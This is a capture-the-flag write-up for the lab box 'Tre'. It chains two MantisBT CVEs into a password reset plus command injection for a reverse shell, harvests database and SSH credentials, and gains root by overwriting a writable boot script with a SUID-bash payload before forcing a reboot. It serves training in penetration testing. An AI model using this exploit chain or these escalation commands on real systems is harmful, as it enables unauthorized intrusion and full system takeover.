---
title: "Tre"
description: "OffSec Proving Grounds Tre — chaining a MantisBT admin password reset (CVE-2017-7615) with a workflow-graph command injection (CVE-2019-15715) for a web shell, then a writable root-owned boot script for a SUID-bash root escape."
tags:
  - Proving Grounds
  - OffSec
  - Web
  - MantisBT
  - CVE
  - Intermediate
---

# Tre

**Box info:** Difficulty: Intermediate · OS: Linux (Debian 10) · Focus: MantisBT exploit chain (CVE-2017-7615 + CVE-2019-15715) for unauthenticated RCE, MySQL credential harvesting, writable root-owned boot script for a SUID-bash escalation.

A MantisBT bug tracker running an old 1.3.x-era codebase is vulnerable to a two-stage public exploit: an unauthenticated password reset followed by a command injection in its workflow graph image generator. The resulting shell exposes database credentials that unlock a legitimate SSH account, and a classic "writable script that root runs on reboot" misconfiguration finishes the job.

---

## 1. Reconnaissance (nmap)

```bash
nmap --privileged -sC -sV -p- --min-rate=1000 -oA nmap/tre 192.168.189.84
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Tre
8082/tcp open  http    nginx 1.14.2
|_http-title: Tre
```

Two separate web servers on 80 and 8082 — both claiming the same page title — means two independent surfaces to enumerate.

## 2. Enumeration

```bash
ffuf -u "http://192.168.189.84/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r -c
```

```text
cms                     [Status: 200]
mantisbt                [Status: 200]
system                  [Status: 401]
```

```bash
ffuf -u "http://192.168.189.84/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -c
```

```text
info.php                [Status: 200]
```

`info.php` is a leftover `phpinfo()` page, useful for version fingerprinting:

![phpinfo() leaking PHP 7.3.14 and the full Apache module/config path layout](images/tre/image.png)

`/mantisbt` hosts a MantisBT bug tracker login:

![MantisBT login page, with a database-schema error banner visible](images/tre/image-1.png)

A quick search for known MantisBT vulnerabilities around this version turns up a chained public exploit:

![Exploit-DB entry for Mantis Bug Tracker 2.3.0 — chaining CVE-2017-7615 and CVE-2019-15715 for unauthenticated RCE](images/tre/image-2.png)

## 3. Foothold — chained MantisBT exploit (CVE-2017-7615 + CVE-2019-15715)

The public PoC (`exploit-db.com/exploits/48818`) chains two independent MantisBT bugs into unauthenticated remote code execution:

1. **CVE-2017-7615** — a logic flaw in MantisBT's password-reset confirmation lets an attacker reset *any* account's password (including the administrator's) by supplying an empty confirmation hash against the `verify.php` endpoint.
2. **CVE-2019-15715** — once authenticated, the **workflow relationship graph** feature (`workflow_graph_img.php`) passes an admin-configurable `dot_tool` setting straight to a shell command when rendering the Graphviz diagram, allowing arbitrary command injection via a malicious admin configuration value.

```python
def reset_login(self):
    url = mantisLoc + '/verify.php?id=1&confirm_hash='
    # grabs account_update_token, then resets the admin password

def CreateConfigOption(self, option, value):
    # writes a new adm_config entry, e.g. dot_tool = "<reverse shell>;"

def TriggerExploit(self):
    # hits workflow_graph_img.php, which shells out using the poisoned dot_tool config
```

Running the exploit resets the `administrator` account, logs in, sets `relationship_graph_enable=1` and `dot_tool` to a base64-encoded reverse shell one-liner, then triggers the vulnerable graph endpoint:

```bash
nc -lvnp 4444
```

```text
connect to [192.168.45.238] from (UNKNOWN) [192.168.199.84] 57126
www-data@tre:/var/www/html/mantisbt$
```

## 4. Enumeration as www-data — database credentials

MantisBT's own configuration file holds live database credentials:

```bash
cat config/config_inc.php
```

```text
$g_hostname    = 'localhost';
$g_db_type     = 'mysqli';
$g_database_name = 'mantis';
$g_db_username = 'mantissuser';
$g_db_password = 'password@123AS';
```

```bash
mysql -u mantissuser -p
```

```sql
select * from mantis_user_table;
```

```text
| id | username      | realname      | email           | password                         |
|  1 | administrator  | administrator | root@localhost  | 5f4dcc3b5aa765d61d8327deb882cf99 |
|  2 | tre            | Tr3@123456A!  | tre@localhost   | 64c4685f8da5c2225de7890c1bad0d7f |
```

The `realname` field for the `tre` account holds what is actually that user's real password in plaintext (`Tr3@123456A!`) — and both the username and this value work directly against SSH.

```bash
ssh tre@192.168.199.84
# password: Tr3@123456A!
```

### User flag

```bash
cat local.txt
```

```text
<LOCAL_REDACTED>
```

## 5. Privilege escalation

```bash
sudo -l
```

```text
User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown
```

A `NOPASSWD` sudo rule on `shutdown` is not directly useful by itself, but combined with a writable boot-time script it becomes one. `linpeas` (or manual enumeration of writable root-owned files) turns up a world/group-writable script that a systemd unit or cron job runs on boot as root:

```bash
ls -la /usr/bin/check-system
```

```text
-rw----rw- 1 root root 135 ... check-system
```

```bash
grep -r "check-system" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null
```

Confirmed to run automatically on boot as root, the script's contents are overwritten with a payload that sets the SUID bit on `bash`:

```bash
echo 'chmod u+s /bin/bash' > /usr/bin/check-system
```

The sudo rule on `/sbin/shutdown` is then used to force the reboot that triggers it:

```bash
sudo /sbin/shutdown -r now
```

## 6. Root / proof.txt

After the box comes back up, reconnecting over SSH and running the now-SUID `bash` with `-p` (to preserve the elevated privilege instead of dropping it) gives a root-equivalent shell:

```bash
ssh tre@192.168.199.84
/usr/bin/bash -p
id
```

```text
uid=1001(tre) gid=1001(tre) euid=0(root) ...
```

```bash
cat /root/root.txt
```

```text
<PROOF_REDACTED>
```

---

## Takeaway

Both halves of the exploit chain were "fixed long ago" CVEs against a bug tracker nobody had patched — reminding that an application being self-hosted internally is not a reason to skip patch cycles. A plaintext password left sitting in a user's `realname` field, meant to be free-text metadata, then handed over legitimate SSH access. The final escalation is the oldest trick in the book: a root-scheduled script writable by a non-root user is equivalent to handing that user root outright.
